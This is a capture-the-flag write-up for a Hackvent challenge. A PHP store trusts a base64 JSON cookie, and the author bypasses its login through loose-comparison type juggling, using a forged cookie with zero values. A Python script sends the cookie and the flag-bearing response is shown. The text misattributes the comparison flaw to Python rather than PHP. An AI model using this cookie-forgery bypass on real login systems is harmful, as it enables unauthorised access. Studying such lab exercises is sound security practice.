---
layout: writeup
title: 'Dec 8: Santa’s Christmas Store'
level:
difficulty:
points:
categories: []
tags: []
flag:  HV15-0Ch0-91zo-m99Y-kxGI-8iQ5

---

## Challenge

*best christmas balls out there*

u wanted to buy one of these beautiful balls for christmas, but Santa's
shop keeps telling you they were sold out ... but maybe you should have
a look yourself in the ...

Hint:

![](writeupfiles/Hint_08.jpg)

## Solution

From the hint we get the following code

    <h1> my store </h1>
    <div>
    <?php

    if($_POST['user']) {
        $auth['user'] = $_POST['user'];
        $auth['password'] = $_POST['password'];
        setcookie('auth', base64_encode(json_encode($auth)));
        $_COOKIE['auth'] = base64_encode(json_encode($auth));
    }

    error_reporting(E_ALL);
    ini_set('display_errors,1');
    $cookie=json_decode(base64_decode(@$_COOKIE['auth']));

    if (!$cookie || $cookie->user != ..<hidden>..

    ?>

    ..login form..

    <?php
    } else{
    ?>

    ..where the nugget is..

    <?php
    }
    ?>
{: .language-php}

From the code we see that if the user has filled in the form, a cookie
is returned with a base64 encoded json representation of the form data.
For example filling in `admin:admin` yields the following
cookie (un base64'ed here):

    {"user":"admin",password":"admin"}

If no data is provided in the POST request, the value stored in the
cookie is used. How does this help us? Well, if the cookie is used to
send username and password,
we can do a bit more than if we use the form. For instance use numbers
as values instead of strings.

Python string comparisons can be tricky, and if `==` is used rather than
`===`, weird things can happen. For instance "somestring" == 0 always
evaluates to `true`! So we post a request with a cookie that looks like

    {"user":0,"password":0}

using python:

    import requests
    import base64

    # the url
    url="http://hackvent.hacking-lab.com/xMasStore_wqbrGjHxxZ9YkbfiKiGC/index.php"

    # create our cookie
    cookiestring='{"user":0,"password":0}'
    cookiestringb64=base64.b64encode(cookiestring)
    cookies=dict(auth=cookiestringb64)

    # post our request
    r=requests.post(url, cookies=cookies)

    # print the response
    print r.text
{: .language-python}

response html page:

    <!doctype html>
    <html><head><title>Santa's Christmas Store - Best Christmas Balls out there - AdminCP</title>
    </head>
    <body>
    <h1>Santa's Christmas Store - Best Christmas Balls out there - AdminCP</h1>
    <div>
          <p>Welcome admin! Here is your daily goodie: <b>HV15-0Ch0-91zo-m99Y-kxGI-8iQ5</b></p>
    </div>
    <h1>NO NEED TO BF (BRUTEFORCE) THIS CHALLENGE, AS WITH ALL CHALLENGES IN HACKVENT, THX!</h1>
    </body>
    </html>
{: .language-html}



